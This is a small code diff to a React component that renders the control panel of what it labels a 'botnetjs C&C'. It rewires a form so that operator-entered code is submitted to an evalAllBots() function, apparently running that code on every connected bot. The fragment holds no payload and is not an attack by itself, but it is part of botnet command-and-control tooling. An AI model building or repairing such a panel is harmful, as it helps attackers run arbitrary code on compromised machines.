@@ -8,9 +8,9 @@ var ControlPanel = React.createClass({
                     <div>This is the control panel.</div>
                     <header>botnetjs C&amp;C</header>
                     <div class="controls">
-                        <form action="evalAllBots();">
+                        <form onSubmit="evalAllBots()">
                         <textarea name="evalme" value="Enter the code to eval here." />
-                        <input type="button" value="Submit" />
+                        <input type="submit" value="Submit" />
                         </form>                    
                     </div>
                     <div class="connections_wrapper">
